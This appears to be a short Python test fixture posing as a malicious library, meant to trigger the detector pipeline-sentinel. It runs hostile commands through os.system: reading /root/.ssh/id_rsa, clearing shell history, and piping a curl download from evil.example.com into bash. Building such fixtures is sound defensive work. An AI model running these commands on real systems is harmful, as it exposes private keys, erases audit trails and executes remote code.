import os
import sys

def main():
    """
    A fake malicious library that performs a series of suspicious actions
    to test the detection capabilities of pipeline-sentinel.
    """
    print("[MALICIOUS LIB] > Execution started.")

    # --- Action 1: Reconnaissance ---
    # Try to figure out who we are running as.
    print("[MALICIOUS LIB] > Performing user reconnaissance...")
    os.system("whoami")

    # --- Action 2: Credential Access ---
    # Try to read a common sensitive file. This will likely fail with
    # a 'No such file or directory' error, but the execution of 'cat'
    # is what we want pipeline-sentinel to detect.
    print("[MALICIOUS LIB] > Attempting to read SSH private key...")
    os.system("cat /root/.ssh/id_rsa")

    # --- Action 3: Defense Evasion ---
    # Attempt to clear shell history.
    print("[MALICIOUS LIB] > Attempting to clear history...")
    os.system("history -c")

    # --- Action 4: Remote Execution Simulation ---
    # This simulates downloading and executing another script.
    print("[MALICIOUS LIB] > Simulating secondary payload download...")
    os.system("curl -s https://evil.example.com/payload | bash")

    print("[MALICIOUS LIB] > Malicious actions complete.")


if __name__ == "__main__":
    main()